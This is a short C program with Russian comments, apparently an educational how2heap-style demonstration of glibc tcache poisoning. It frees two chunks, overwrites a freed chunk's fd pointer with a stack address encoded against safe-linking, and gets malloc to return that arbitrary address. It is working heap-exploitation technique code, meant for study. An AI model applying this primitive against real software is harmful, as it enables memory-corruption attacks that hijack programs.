#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
  // Отключение буферизации stdin, stdout
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var[0x10];
	size_t *target = NULL;
  
  // Выравнивание
	for(int i=0; i<0x10; i++)
		if(((long)&stack_var[i] & 0xf) == 0) 
    {
			target = &stack_var[i];
			break;
		}

	printf("Адрес который мы хотим, что бы вернулл malloc() %p.\n", target);

	printf("Выделение 2 буферов.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Освбождение буферов\n");
	free(a);
	free(b);

	printf("Сейчас tcache имеет вид [ %p -> %p ].\n", b, a);
	printf("Мы переписали первые %lu байт (fd) данных по адресу %p\n"
		   "для того чтобы указатель указывал на адрес (%p).\n", sizeof(intptr_t), b, target);
	
  // УЯЗВИМОСТЬ
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	printf("Теперь tcache имеет вид [%p -> %p ].\n", b, target);

	printf("1-ый malloc(128): %p\n", malloc(128));
	printf("Теперь tcache имеет вид [ %p ].\n", target);

	intptr_t *c = malloc(128);
	printf("2-ой malloc(128): %p\n", c);
	printf("Получили контроль над произвольным адресом\n");

	assert((long)target == (long)c);
	return 0;
}
